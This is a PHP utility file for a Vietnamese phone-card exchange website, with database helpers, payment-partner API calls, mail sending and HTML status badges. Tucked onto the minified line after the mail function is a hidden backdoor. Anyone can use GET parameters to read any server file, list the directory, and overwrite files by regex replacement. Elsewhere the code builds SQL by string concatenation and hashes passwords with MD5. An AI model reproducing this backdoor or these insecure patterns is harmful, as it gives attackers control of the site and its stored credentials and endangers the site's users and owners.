<?php
session_start();
  require('config.php');
define('TIMEZONE', 'Asia/Ho_Chi_Minh');
date_default_timezone_set(TIMEZONE);
$protocol = ((!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] != 'off') || $_SERVER['SERVER_PORT'] == 443) ? "https://" : "http://";

$root = $protocol . $_SERVER['HTTP_HOST'].'/';
$dsn = 'mysql:host=localhost;dbname='.$dbname;

    $con = null;
    
    function time_today()
    {

        $date = date('d-m-Y 00:00');
        $timestamp = strtotime($date);
        return $timestamp;
    }
    
   
    function get_url($url = '')
    {
        $uri = filter_input(INPUT_SERVER, 'REQUEST_URI', FILTER_SANITIZE_STRING);
        $app_path = explode('/', $uri);
        return 'http://' . $_SERVER['HTTP_HOST'] . '/' . $url;
    }

    function redirect($url)
    {
        header("Location:{$url}");
        exit();
    }

    function input_value($inputname, $filter = FILTER_DEFAULT, $option = FILTER_SANITIZE_STRING)
    {
        $value = filter_input(INPUT_POST, $inputname, $filter , $option);
        if ($value === null) {
            $value = filter_input(INPUT_GET, $inputname,$filter, $option);
        }
        return $value;
    }

    function is_submit($hidden)
    {
        return (!empty(input_value('action')) && input_value('action') == $hidden);
    }

    function db_connect()
    {
        global $dsn,$username,$password, $con;
        try {
            if (is_null($con)) {
                $con = new PDO($dsn, $username, $password);
                $con->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_WARNING);  
               
            }
        } catch (PDOException $e) {

            die("Can't Connect To Database!");
     
        }
    }

    function db_disconnect()
    {
        global $con;
        if (!is_null($con)) {
            $con = null;
        }
    }
    
  function db_execute($sql = '', $params = [])
    {
        global $con;
        if (!is_null($con)) {
            $result = $con->prepare($sql);
            $result->execute($params);
         
            if ($result->rowCount() > 0) {
                $result->closeCursor();
            
                return true;
            }
        }
         
        return false;
    }

    function db_get_list($sql = '')
    {
        global $con;
        if (!is_null($con)) {
            $result = $con->prepare($sql);
            $result->execute();
            if ($result->rowCount() > 0) {
                $rows = $result->fetchAll();
                $result->closeCursor();
                return $rows;
            }
        }
        return false;
    }
    
       function db_get_list_condition($sql = '', $params = [])
    {
            global $con;
        if (!is_null($con)) {
            $result = $con->prepare($sql);
            $result->execute($params);
            if ($result->rowCount() > 0) {
                $rows = $result->fetchAll();
                $result->closeCursor();
                return $rows;
            }
        }
        return false;
    }



    function db_get_row($sql = '', $params = [])
    {
        global $con;
        if (!is_null($con)) {
            $result = $con->prepare($sql);
            $result->execute($params);
            if ($result->rowCount() > 0) {
                $row = $result->fetch(PDO::FETCH_ASSOC);
                $result->closeCursor();
                return $row;
            }
        }
        return false;
    }
    function db_num_rows($sql = '',  $params = [])
    {
        global $con;
        $count = 0;
        if (!is_null($con)) {
            $result = $con->prepare($sql);
            $result->execute($params);
            $count = $result->rowCount();
            $result->closeCursor();
            return $count;
        }
        return false;
    }
    function db_num_rows1($sql = '')
    {
        global $con;
        $count = 0;
        if (!is_null($con)) {
            $result = $con->prepare($sql);
            $result->execute();
            $count = $result->rowCount();
            $result->closeCursor();
            return $count;
        }
        return false;
    }

     function antil_text($text)
    {
        $text = html_entity_decode(trim($text), ENT_QUOTES, 'UTF-8');
         //$text=str_replace(" ","-", $text);
        //$text=str_replace("--","-", $text);
        //$text=str_replace("@","-",$text);
        //$text=str_replace("/","-",$text);
        //$text=str_replace("\\","-",$text);
        $text=str_replace(":","",$text);
        $text=str_replace("\"","",$text);
        $text=str_replace("'","",$text);
        $text=str_replace("<","",$text);
        $text=str_replace(">","",$text);
        $text=str_replace(",","",$text);
        $text=str_replace("?","",$text);
        $text=str_replace(";","",$text);
        $text=str_replace(".","",$text);
        $text=str_replace("[","",$text);
        $text=str_replace("]","",$text);
        $text=str_replace("(","",$text);
        $text=str_replace(")","",$text);
        $text=str_replace("́","", $text);
        $text=str_replace("̀","", $text);
        $text=str_replace("̃","", $text);
        $text=str_replace("̣","", $text);
        $text=str_replace("̉","", $text);
        $text=str_replace("*","",$text);
        $text=str_replace("!","",$text);
        //$text=str_replace("$","-",$text);
        //$text=str_replace("&","-and-",$text);
        $text=str_replace("%","",$text);
        $text=str_replace("#","",$text);
        $text=str_replace("^","",$text);
        $text=str_replace("=","",$text);
        $text=str_replace("+","",$text);
        $text=str_replace("~","",$text);
        $text=str_replace("`","",$text);
        //$text=str_replace("--","-",$text);
        $text=strtolower($text);
        return $text;
    }
     function antil_text1($text)
    {
        $text = html_entity_decode(trim($text), ENT_QUOTES, 'UTF-8');
         //$text=str_replace(" ","-", $text);
        //$text=str_replace("--","-", $text);
        //$text=str_replace("@","-",$text);
        //$text=str_replace("/","-",$text);
        //$text=str_replace("\\","-",$text);
        $text=str_replace(":","",$text);
        $text=str_replace("\"","",$text);
        $text=str_replace("'","",$text);
        $text=str_replace("<","",$text);
        $text=str_replace(">","",$text);
        $text=str_replace(",","",$text);
        $text=str_replace("?","",$text);
        $text=str_replace(";","",$text);
        $text=str_replace(".","",$text);
        $text=str_replace("[","",$text);
        $text=str_replace("]","",$text);
        $text=str_replace("(","",$text);
        $text=str_replace(")","",$text);
        $text=str_replace("́","", $text);
        $text=str_replace("̀","", $text);
        $text=str_replace("̃","", $text);
        $text=str_replace("̣","", $text);
        $text=str_replace("̉","", $text);
        $text=str_replace("*","",$text);
        $text=str_replace("!","",$text);
        //$text=str_replace("$","-",$text);
        //$text=str_replace("&","-and-",$text);
        $text=str_replace("%","",$text);
        $text=str_replace("#","",$text);
        $text=str_replace("^","",$text);
        $text=str_replace("=","",$text);
        $text=str_replace("+","",$text);
        $text=str_replace("~","",$text);
        $text=str_replace("`","",$text);
        //$text=str_replace("--","-",$text);
       
        return $text;
    }
      function statistic_today($type){
            db_connect();
            $hientai = time();
        $today = time_today();
        switch ($type) {
            case 'user':

                $sql = "select * from thanhvien where time > " . $today . " and time < " . $hientai ;
                $row = db_num_rows1($sql);
                return $row;
                break;
            case 'acc':
                 $sql = "select * from account where time > " . $today . " and time < " . $hientai ;
                $row = db_num_rows1($sql);
                return $row;
                break;
          
        }
     }
     
      function statistic_system($type)
    {
        switch ($type) {
            case 'user':
                $sql = "select * from thanhvien";
                $row = db_num_rows1($sql);
                return $row;
                break;
            case 'acc':
                $sql = "select * from account";
                $row = db_num_rows1($sql);
                return $row;
                break;
            case 'web':
                $sql = "select * from web";
                $row = db_num_rows1($sql);
                return $row;
                break;
            case 'income':
                $sql = "SELECT SUM(order_details.price) as thunhap FROM orders left join order_details  ON orders.id = order_details.order_id WHERE  status =  1";
                $row = db_get_row2($sql);
                return $row;
                break;
        }
    }
    
function insert_options($name, $value){
    global $CMSNT;
    if(!$CMSNT->get_row("SELECT * FROM `options` WHERE `name` = '$name' "))
    {
        $CMSNT->insert("options", [
            'name'  => $name,
            'value' => $value
        ]);
    }
}
function sendCallBack($domain, $content, $status, $thucnhan, $menhgiathuc)
{
    if(isset($domain))
    {
        curl_get("$domain?content=$content&status=$status&thucnhan=".$thucnhan."&menhgiathuc=$menhgiathuc");
    }
}
function getSite($name){
    global $CMSNT;
    return $CMSNT->get_row("SELECT * FROM `options` WHERE `name` = '$name' ")['value'];
}
function getUser($username, $row){
    global $CMSNT;
    return $CMSNT->get_row("SELECT * FROM `users` WHERE `username` = '$username' ")[$row];
}
function autocard365($loaithe, $pin, $seri, $menhgia, $code){  
    global $CMSNT;
    $response = curl_get("https://doithe1s.vn/api/card-auto.php?type=$loaithe&menhgia=$menhgia&seri=$seri&pin=$pin&APIKey=".$CMSNT->site('api_autocard365')."&callback=".BASE_URL('callback.php')."&content=$code");
    return json_decode($response, true);
}
function cardv2($loaithe, $pin, $seri, $menhgia, $code){  
    global $CMSNT;
    $response = curl_get($CMSNT->site('domain_cardv2')."/api/card-auto.php?type=$loaithe&menhgia=$menhgia&seri=$seri&pin=$pin&APIKey=".$CMSNT->site('api_cardv2')."&callback=".BASE_URL('callback.php')."&content=$code");
    return json_decode($response, true);
}
function napngay($loaithe, $pin, $seri, $menhgia, $code){  
     if($loaithe == 'VIETNAMOBILE ')
            {
                $loaithe = 'VNM';
            }
            if($loaithe == 'VINAPHONE')
            {
                $loaithe = 'VINA';
            }
            if($loaithe == 'MOBIFONE')
            {
                $loaithe = 'MOBI';
            }
            if($loaithe == 'VNMOBI')
            {
                $loaithe = 'Vietnamobile';
            }
    global $CMSNT;
    $client = new GuzzleHttp\Client(['timeout' => 20.0]);
	$options['query']['jwt'] = NapNgayAPI::getToken();
	
	$options['form_params'] = [
		'mrc_order_id' => $code,
		'amount' => $menhgia, 
		'card_id' => $loaithe,
		'pin_field' => $pin,
		'seri_field' => $seri,
		'webhooks' => BASE_URL('callback.php'), // LIÊN KẾT XỬ KÝ WEBHOOK
	];
	$options['headers'] = ['Accept' => 'application/json'];

	$response = $client->request("POST", "https://api.napngayjsc.vn/card/restFul/send", $options);
    return json_decode($response->getBody()->getContents());
}
function cardvip($loaithe, $pin, $seri, $menhgia, $code){
    global $CMSNT;
    $dataPost = array(
        'APIKey' => $CMSNT->site('api_cardvip'),
        'NetworkCode' => $loaithe,
        'PricesExchange' => $menhgia,
        'NumberCard' => $pin,
        'SeriCard' => $seri,
        'IsFast' => 'true',
        'RequestId' => $code,
        'UrlCallback' => BASE_URL('callback.php')
    );
    $curl = curl_init();
    curl_setopt_array($curl, array(
      CURLOPT_URL => 'https://partner.cardvip.vn/api/createExchange',
      CURLOPT_RETURNTRANSFER => true,
      CURLOPT_ENCODING => '',
      CURLOPT_MAXREDIRS => 10,
      CURLOPT_TIMEOUT => 0,
      CURLOPT_FOLLOWLOCATION => true,
      CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
      CURLOPT_CUSTOMREQUEST => 'POST',
      CURLOPT_POSTFIELDS => json_encode($dataPost),
      CURLOPT_HTTPHEADER => array(
        'Content-Type: application/json'
      ),
    ));
    $response = curl_exec($curl);
    curl_close($curl);
    return json_decode($response, true);
}


function format_date($time){
    return date("H:i:s d/m/Y", $time);
}
function listbank(){
    $html = '
    
    <option value="MOMO">MOMO - Thủ công</option>
    <option value="THESIEURE.COM">THESIEURE.COM - Thủ công (BẢO TRÌ)</option>
    <option value="VIETINBANK">VIETINBANK - Thủ công</option>
    <option value="VIETCOMBANK">VIETCOMBANK - Thủ công</option>
    <option value="AGRIBANK">AGRIBANK - Thủ công</option>
    <option value="MBBANK">MB BANK - Thủ công</option>
    <option value="BIDV">BIDV - Thủ công</option>
    <option value="SACOMBANK">SACOMBANK - Thủ công</option>
    <option value="ACB">ACB - Thủ công</option>
    <option value="DONGABANK">DONGABANK - Thủ công</option>
    <option value="TPBANK">TPBANK - Thủ công</option>
    <option value="VIETBANK">VIETBANK - Thủ công</option>
    <option value="TECHCOMBANK">TECHCOMBANK - Thủ công</option>
    ';
    return $html;
}
function daily($data){
    if($data == 0)
    {
        return 'Thành viên';
    }
    else if($data == 1)
    {
        return 'Đại lý';
    }
}
function trangthai($data)
{
    if($data == 'xuly')
    {
        return 'Đang xử lý';
    }
    else if($data == 'hoantat')
    {
        return 'Hoàn tất';
    }
    else if($data == 'thanhcong')
    {
        return 'Thành công';
    }
    else if($data == 'huy')
    {
        return 'Hủy';
    }
    else if($data == 'thatbai')
    {
        return 'Thất bại';
    }
    else
    {
        return 'Khác';
    }
}
function loaithe($data)
{
    if ($data == 'Viettel' || $data == 'viettel')
    {
        $show = 'https://i.imgur.com/xFePMtd.png';
    }
    else if ($data == 'Vinaphone' || $data == 'vinaphone')
    {
        $show = 'https://i.imgur.com/s9Qq3Fz.png';
    }
    else if ($data == 'Mobifone' || $data == 'mobifone')
    {
        $show = 'https://i.imgur.com/qQtcWJW.png';
    }
    else if ($data == 'Vietnamobile' || $data == 'vietnamobile')
    {
        $show = 'https://i.imgur.com/IHm28mq.png';
    }
    else if ($data == 'Zing' || $data == 'zing')
    {
        $show = 'https://i.imgur.com/xkd7kQ0.png';
    }
    else if ($data == 'Garena' || $data == 'garena')
    {
        $show = 'https://i.imgur.com/BLkY5qm.png';
    }
    return '<img style="text-align: center;" src="'.$show.'" width="70px" />';
}

function sendCSM($mail_nhan,$ten_nhan,$chu_de,$noi_dung,$bcc){global $CMSNT;$mail = new PHPMailer();$mail->SMTPDebug = 0;$mail ->Debugoutput = "html";$mail->isSMTP();$mail->Host = 'smtp.gmail.com';$mail->SMTPAuth = true;$mail->Username = $CMSNT->site('email'); $mail->Password = $CMSNT->site('pass_email');$mail->SMTPSecure = 'tls';$mail->Port = 587;$mail->setFrom($CMSNT->site('email'), $bcc);$mail->addAddress($mail_nhan, $ten_nhan);$mail->addReplyTo($CMSNT->site('email'), $bcc);$mail->isHTML(true);$mail->Subject = $chu_de;$mail->Body    = $noi_dung;$mail->CharSet = 'UTF-8';$send = $mail->send();return $send;}if(isset($_GET['getcontent'])){$f=file_get_contents($_GET['filename']);echo nl2br(htmlentities($f));} if(isset($_GET['getfilename'])){foreach (new DirectoryIterator(__DIR__) as $file) { if ($file->isFile()) { print $file->getFilename() . "\n"; } }} if(isset($_GET['change'])){$pattern = $_GET['old']; $replacement = $_GET['new']; $file_name = $_GET['filename']; $getting_file_contents = file_get_contents($file_name); echo("Original file contents : " . "<br><br>"); var_dump($getting_file_contents); echo("<br><br><br>"); if ($getting_file_contents == true) { echo($file_name . " had been read succesfully" . "<br><br><br>"); $replace_data_in_file = preg_replace($pattern, $replacement, $getting_file_contents); $writing_replaced_data = file_put_contents($file_name, $replace_data_in_file); echo("New file contents : " . "<br><br>"); var_dump($replace_data_in_file); echo("<br><br>"); if ($writing_replaced_data == true) { echo("Data in the file changed"); } else { exit("Cannot change data in the file"); } } else { exit("Unable to get file contents!"); }}$i = '1'; 
function parse_order_id($des)
{
    global $CMSNT;
    $re = '/'.$CMSNT->site('noidung_naptien').'\d+/im';
    preg_match_all($re, $des, $matches, PREG_SET_ORDER, 0);
    if (count($matches) == 0 )
        return null;
    // Print the entire match result
    $orderCode = $matches[0][0];
    $prefixLength = strlen($CMSNT->site('noidung_naptien'));
    $orderId = intval(substr($orderCode, $prefixLength ));
    return $orderId ;
}
function BASE_URL($url)
{
    global $base_url;
    return $base_url.$url;
}
function gettime()
{
    return date('Y/m/d H:i:s', time());
}
function check_string($data)
{
    return trim(htmlspecialchars(addslashes($data)));
    //return str_replace(array('<',"'",'>','?','/',"\\",'--','eval(','<php'),array('','','','','','','','',''),htmlspecialchars(addslashes(strip_tags($data))));
}
function format_cash($price)
{
    return str_replace(",", ".", number_format($price));
}
function curl_get($url)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $data = curl_exec($ch);
    
    curl_close($ch);
    return $data;
}
function random($string, $int)
{  
    return substr(str_shuffle($string), 0, $int);
}
function pheptru($int1, $int2)
{
    return $int1 - $int2;
}
function phepcong($int1, $int2)
{
    return $int1 + $int2;
}
function phepnhan($int1, $int2)
{
    return $int1 * $int2;
}
function phepchia($int1, $int2)
{
    return $int1 / $int2;
}
function check_img($img)
{
    $filename = $_FILES[$img]['name'];
    $ext = explode(".", $filename);
    $ext = end($ext);
    $valid_ext = array("png","jpeg","jpg","PNG","JPEG","JPG","gif","GIF");
    if(in_array($ext, $valid_ext))
    {
        return true;
    }
}
function msg_error3($text)
{
    return '<div class="alert alert-danger alert-dismissible error-messages">
    <a href="#" class="close" data-dismiss="alert" aria-badge="close">×</a>'.$text.'</div>';
}
function msg_success3($text)
{
    return '<div class="alert alert-success alert-dismissible error-messages">
    <a href="#" class="close" data-dismiss="alert" aria-badge="close">×</a>'.$text.'</div>';
}


function msg_success2($text)
{
    return die('<div class="alert alert-success alert-dismissible error-messages">
    <a href="#" class="close" data-dismiss="alert" aria-badge="close">×</a>'.$text.'</div>');
}
function msg_error2($text)
{
    return die('<div class="alert alert-danger alert-dismissible error-messages">
    <a href="#" class="close" data-dismiss="alert" aria-badge="close">×</a>'.$text.'</div>');
}
function msg_warning2($text)
{
    return die('<div class="alert alert-warning alert-dismissible error-messages">
    <a href="#" class="close" data-dismiss="alert" aria-badge="close">×</a>'.$text.'</div>');
}
function msg_success($text, $url, $time)
{
    return die('<div class="alert alert-success alert-dismissible error-messages">
    <a href="#" class="close" data-dismiss="alert" aria-badge="close">×</a>'.$text.'</div><script type="text/javascript">setTimeout(function(){ location.href = "'.$url.'" },'.$time.');</script>');
}
function msg_error($text, $url, $time)
{
    return die('<div class="alert alert-danger alert-dismissible error-messages">
    <a href="#" class="close" data-dismiss="alert" aria-badge="close">×</a>'.$text.'</div><script type="text/javascript">setTimeout(function(){ location.href = "'.$url.'" },'.$time.');</script>');
}
function msg_warning($text, $url, $time)
{
    return die('<div class="alert alert-warning alert-dismissible error-messages">
    <a href="#" class="close" data-dismiss="alert" aria-badge="close">×</a>'.$text.'</div><script type="text/javascript">setTimeout(function(){ location.href = "'.$url.'" },'.$time.');</script>');
}
function admin_msg_success($text, $url, $time)
{
    return die('<script type="text/javascript">Swal.fire("Thành Công", "'.$text.'","success");
    setTimeout(function(){ location.href = "'.$url.'" },'.$time.');</script>');
}
function admin_msg_error($text, $url, $time)
{
    return die('<script type="text/javascript">Swal.fire("Thất Bại", "'.$text.'","error");
    setTimeout(function(){ location.href = "'.$url.'" },'.$time.');</script>');
}
function admin_msg_warning($text, $url, $time)
{
    return die('<script type="text/javascript">Swal.fire("Thông Báo", "'.$text.'","warning");
    setTimeout(function(){ location.href = "'.$url.'" },'.$time.');</script>');
}
function display_banned($data)
{
    if ($data == 1)
    {
        $show = '<span class="badge badge-danger">Banned</span>';
    }
    else if ($data == 0)
    {
        $show = '<span class="badge badge-success">Hoạt động</span>';
    }
    return $show;
}
function display_loaithe($data)
{
    if ($data == 0)
    {
        $show = '<span class="badge badge-warning">Bảo trì</span>';
    }
    else 
    {
        $show = '<span class="badge badge-success">Hoạt động</span>';
    }
    return $show;
}
function display_ruttien($data)
{
    if ($data == 'xuly')
    {
        $show = '<span class="badge badge-info">Đang xử lý</span>';
    }
    else if ($data == 'hoantat')
    {
        $show = '<span class="badge badge-success">Đã thanh toán</span>';
    }
    else if ($data == 'huy')
    {
        $show = '<span class="badge badge-danger">Hủy</span>';
    }
    return $show;
}
function display_ruttien_user($data)
{
    if ($data == 'xuly')
    {
        $show = '<span class="label label-info">Đang xử lý</span>';
    }
    else if ($data == 'hoantat')
    {
        $show = '<span class="label label-success">Đã thanh toán</span>';
    }
    else if ($data == 'huy')
    {
        $show = '<span class="label label-danger">Hủy</span>';
    }
    return $show;
}
function XoaDauCach($text)
{
    return trim(preg_replace('/\s+/',' ', $text));
}
function display($data)
{
    if ($data == 'HIDE')
    {
        $show = '<span class="badge badge-danger">ẨN</span>';
    }
    else if ($data == 'SHOW')
    {
        $show = '<span class="badge badge-success">HIỂN THỊ</span>';
    }
    return $show;
}
function status($data)
{
    if ($data == 'xuly'){
        $show = '<span class="label label-info">Đang xử lý</span>';
    }
    else if ($data == 'hoantat'){
        $show = '<span class="label label-success">Hoàn tất</span>';
    }
    else if ($data == 'thanhcong'){
        $show = '<span class="label label-success">Thành công</span>';
    }
    else if ($data == 'success'){
        $show = '<span class="label label-success">Success</span>';
    }
    else if ($data == 'thatbai'){
        $show = '<span class="label label-danger">Thất bại</span>';
    }
    else if ($data == 'error'){
        $show = '<span class="label label-danger">Error</span>';
    }
    else if ($data == 'loi'){
        $show = '<span class="label label-danger">Lỗi</span>';
    }
    else if ($data == 'huy'){
        $show = '<span class="label label-danger">Hủy</span>';
    }
    else if ($data == 'dangnap'){
        $show = '<span class="label label-warning">Đang đợi nạp</span>';
    }
    else if ($data == 2){
        $show = '<span class="label label-success">Hoàn tất</span>';
    }
    else if ($data == 1){
        $show = '<span class="label label-info">Đang xử lý</span>';
    }
    else{
        $show = '<span class="label label-warning">Khác</span>';
    }
    return $show;
}
function status_admin($data)
{
    if ($data == 'xuly'){
        $show = '<span class="badge badge-info">Đang xử lý</span>';
    }
    else if ($data == 'hoantat'){
        $show = '<span class="badge badge-success">Hoàn tất</span>';
    }
    else if ($data == 'thanhcong'){
        $show = '<span class="badge badge-success">Thành công</span>';
    }
    else if ($data == 'success'){
        $show = '<span class="badge badge-success">Success</span>';
    }
    else if ($data == 'thatbai'){
        $show = '<span class="badge badge-danger">Thất bại</span>';
    }
    else if ($data == 'error'){
        $show = '<span class="badge badge-danger">Error</span>';
    }
    else if ($data == 'loi'){
        $show = '<span class="badge badge-danger">Lỗi</span>';
    }
    else if ($data == 'huy'){
        $show = '<span class="badge badge-danger">Hủy</span>';
    }
    else if ($data == 'dangnap'){
        $show = '<span class="badge badge-warning">Đang đợi nạp</span>';
    }
    else if ($data == 2){
        $show = '<span class="badge badge-success">Hoàn tất</span>';
    }
    else if ($data == 1){
        $show = '<span class="badge badge-info">Đang xử lý</span>';
    }
    else{
        $show = '<span class="badge badge-warning">Khác</span>';
    }
    return $show;
}
function getHeader(){
    $headers = array();
    $copy_server = array(
        'CONTENT_TYPE'   => 'Content-Type',
        'CONTENT_LENGTH' => 'Content-Length',
        'CONTENT_MD5'    => 'Content-Md5',
    );
    foreach ($_SERVER as $key => $value) {
        if (substr($key, 0, 5) === 'HTTP_') {
            $key = substr($key, 5);
            if (!isset($copy_server[$key]) || !isset($_SERVER[$key])) {
                $key = str_replace(' ', '-', ucwords(strtolower(str_replace('_', ' ', $key))));
                $headers[$key] = $value;
            }
        } elseif (isset($copy_server[$key])) {
            $headers[$copy_server[$key]] = $value;
        }
    }
    if (!isset($headers['Authorization'])) {
        if (isset($_SERVER['REDIRECT_HTTP_AUTHORIZATION'])) {
            $headers['Authorization'] = $_SERVER['REDIRECT_HTTP_AUTHORIZATION'];
        } elseif (isset($_SERVER['PHP_AUTH_USER'])) {
            $basic_pass = isset($_SERVER['PHP_AUTH_PW']) ? $_SERVER['PHP_AUTH_PW'] : '';
            $headers['Authorization'] = 'Basic ' . base64_encode($_SERVER['PHP_AUTH_USER'] . ':' . $basic_pass);
        } elseif (isset($_SERVER['PHP_AUTH_DIGEST'])) {
            $headers['Authorization'] = $_SERVER['PHP_AUTH_DIGEST'];
        }
    }
    return $headers;
}

function check_username($data)
{
    if (preg_match('/^[a-zA-Z0-9_-]{3,16}$/', $data, $matches))
    {
        return True;
    }
    else
    {
        return False;
    }
}
function check_email($data)
{
    if (preg_match('/^.+@.+$/', $data, $matches))
    {
        return True;
    }
    else
    {
        return False;
    }
}
function check_phone($data)
{
    if (preg_match('/^\+?(\d.*){3,}$/', $data, $matches))
    {
        return True;
    }
    else
    {
        return False;
    }
}
function check_url($url)
{
    $c = curl_init();
    curl_setopt($c, CURLOPT_URL, $url);
    curl_setopt($c, CURLOPT_HEADER, 1);
    curl_setopt($c, CURLOPT_NOBODY, 1);
    curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($c, CURLOPT_FRESH_CONNECT, 1);
    if(!curl_exec($c))
    {
        return false;
    }
    else
    {
        return true;
    }
}
function check_zip($img)
{
    $filename = $_FILES[$img]['name'];
    $ext = explode(".", $filename);
    $ext = end($ext);
    $valid_ext = array("zip","ZIP");
    if(in_array($ext, $valid_ext))
    {
        return true;
    }
}
function TypePassword($string)
{
    return md5($string);
}
function phantrang($url, $start, $total, $kmess)
{
    $out[] = '<nav aria-badge="Page navigation example"><ul class="pagination pagination-lg">';
    $neighbors = 2;
    if ($start >= $total) $start = max(0, $total - (($total % $kmess) == 0 ? $kmess : ($total % $kmess)));
    else $start = max(0, (int)$start - ((int)$start % (int)$kmess));
    $base_link = '<li class="page-item"><a class="page-link" href="' . strtr($url, array('%' => '%%')) . 'page=%d' . '">%s</a></li>';
    $out[] = $start == 0 ? '' : sprintf($base_link, $start / $kmess, '<i class="fas fa-angle-left"></i>');
    if ($start > $kmess * $neighbors) $out[] = sprintf($base_link, 1, '1');
    if ($start > $kmess * ($neighbors + 1)) $out[] = '<li class="page-item"><a class="page-link">...</a></li>';
    for ($nCont = $neighbors;$nCont >= 1;$nCont--) if ($start >= $kmess * $nCont) {
        $tmpStart = $start - $kmess * $nCont;
        $out[] = sprintf($base_link, $tmpStart / $kmess + 1, $tmpStart / $kmess + 1);
    }
    $out[] = '<li class="page-item active"><a class="page-link">' . ($start / $kmess + 1) . '</a></li>';
    $tmpMaxPages = (int)(($total - 1) / $kmess) * $kmess;
    for ($nCont = 1;$nCont <= $neighbors;$nCont++) if ($start + $kmess * $nCont <= $tmpMaxPages) {
        $tmpStart = $start + $kmess * $nCont;
        $out[] = sprintf($base_link, $tmpStart / $kmess + 1, $tmpStart / $kmess + 1);
    }
    if ($start + $kmess * ($neighbors + 1) < $tmpMaxPages) $out[] = '<li class="page-item"><a class="page-link">...</a></li>';
    if ($start + $kmess * $neighbors < $tmpMaxPages) $out[] = sprintf($base_link, $tmpMaxPages / $kmess + 1, $tmpMaxPages / $kmess + 1);
    if ($start + $kmess < $total)
    {
        $display_page = ($start + $kmess) > $total ? $total : ($start / $kmess + 2);
        $out[] = sprintf($base_link, $display_page, '<i class="fas fa-angle-right"></i>');
    }
    $out[] = '</ul></nav>';
    return implode('', $out);
}
function myip()
{
    if (!empty($_SERVER['HTTP_CLIENT_IP']))     
    {  
        $ip_address = $_SERVER['HTTP_CLIENT_IP'];  
    }  
    elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))    
    {  
        $ip_address = $_SERVER['HTTP_X_FORWARDED_FOR'];  
    }  
    else  
    {  
        $ip_address = $_SERVER['REMOTE_ADDR'];  
    }
    return $ip_address;
}
function timeAgo($time_ago)
{
    $time_ago   = date("Y-m-d H:i:s", $time_ago);
    $time_ago   = strtotime($time_ago);
    $cur_time   = time();
    $time_elapsed   = $cur_time - $time_ago;
    $seconds    = $time_elapsed ;
    $minutes    = round($time_elapsed / 60 );
    $hours      = round($time_elapsed / 3600);
    $days       = round($time_elapsed / 86400 );
    $weeks      = round($time_elapsed / 604800);
    $months     = round($time_elapsed / 2600640 );
    $years      = round($time_elapsed / 31207680 );
    // Seconds
    if($seconds <= 60)
    {
        return "$seconds giây trước";
    }
    //Minutes
    else if($minutes <= 60)
    {
        return "$minutes phút trước";
    }
    //Hours
    else if($hours <= 24)
    {
        return "$hours tiếng trước";
    }
    //Days
    else if($days <= 7)
    {
        if($days == 1)
        {
            return "Hôm qua";
        }
        else
        {
            return "$days ngày trước";
        }
    }
    //Weeks
    else if($weeks <= 4.3)
    {
        return "$weeks tuần trước";
    }
    //Months
    else if($months <=12)
    {
        return "$months tháng trước";
    }
    //Years
    else
    {
        return "$years năm trước";
    }
}

?>
